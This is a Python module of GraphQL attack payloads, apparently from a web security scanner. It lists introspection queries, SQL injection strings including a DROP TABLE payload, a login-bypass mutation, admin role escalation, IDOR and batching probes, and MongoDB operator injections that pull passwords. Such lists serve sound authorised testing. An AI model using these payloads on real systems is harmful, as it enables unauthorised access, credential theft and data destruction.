"""graphql.py — GraphQL Introspection, Injection & NoSQL Payloads"""

# ─────────────────────────────────────────────
# GraphQL Introspection
# ─────────────────────────────────────────────
GRAPHQL_INTROSPECTION: list[str] = [
    # Full schema introspection
    '{"query": "{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}"}',
    # Type names only (less verbose)
    '{"query": "{__schema{types{name}}}"}',
    # Query type
    '{"query": "{__schema{queryType{name fields{name}}}}"}',
    # Quick check
    '{"query": "{__typename}"}',
    # Field types
    '{"query": "{__type(name:\\"User\\"){name fields{name type{name kind}}}}"}',
    # ALternate format
    "query={__schema{types{name}}}",
    "query={__typename}",
    # Fragment-based
    '{"query": "fragment on __Schema {queryType {name}}"}',
    # Aliases
    '{"query": "{a:__typename b:__typename}"}',
]

# ─────────────────────────────────────────────
# GraphQL Injection
# ─────────────────────────────────────────────
GRAPHQL_INJECTION: list[str] = [
    # SQL injection via GraphQL
    '{"query": "{user(id:\\"1 OR 1=1\\"){name email}}"}',
    '{"query": "{user(id:\\"1; DROP TABLE users--\\"){name}}"}',
    '{"query": "{users(filter:\\"1\\\' OR \\\'1\\\'=\\\'1\\"){name email password}}"}',
    # IDOR via GraphQL
    '{"query": "{user(id:2){name email phone}}"}',
    '{"query": "{user(id:3){name email admin}}"}',
    '{"query": "{order(id:1){total items}}"}',
    # Batch attack (brute force via batching)
    '[{"query":"{user(id:1){name}}"}, {"query":"{user(id:2){name}}"}, {"query":"{user(id:3){name}}"}]',
    # Alias-based info extraction
    '{"query": "{user1:user(id:1){name email} user2:user(id:2){name email}}"}',
    # Directive bypass
    '{"query": "{__schema @deprecated {types{name}}}"}',
    # Query depth attack
    '{"query": "{user{friends{friends{friends{friends{name}}}}}}"}',
    # Mutation injection
    '{"query": "mutation {updateUser(id:\\"1\\" role:\\"admin\\") {id role}}"}',
    "{\"query\": \"mutation {login(username:\\\"admin\\\" password:\\\"' OR 1=1--\\\") {token}}\"}",
    # Variables injection
    '{"query": "query GetUser($id: ID!) {user(id: $id){name}}", "variables": {"id": "1 OR 1=1"}}',
]

# ─────────────────────────────────────────────
# GraphQL → NoSQL Injection
# ─────────────────────────────────────────────
GRAPHQL_NOSQL: list[str] = [
    # MongoDB operator injection
    '{"query": "{user(username:{$gt:\\"\\"}){name email password}}"}',
    '{"query": "{user(username:{$regex:\\".*\\"}){name email}}"}',
    '{"query": "{user(password:{$ne:\\"x\\"}){name email}}"}',
    # JSON operator payloads
    '{"username": {"$gt": ""}}',
    '{"username": {"$regex": ".*"}}',
    '{"password": {"$ne": "invalid"}}',
    '{"username": {"$in": ["admin", "administrator", "root"]}}',
    '{"$where": "this.role == \'admin\'"}',
    # Where clause injection
    '{"query": "{users(where:{username_contains:\\"a\\"}){name password}}"}',
    # Field injection
    '{"query": "{users{id username password email role __typename}}"}',
]
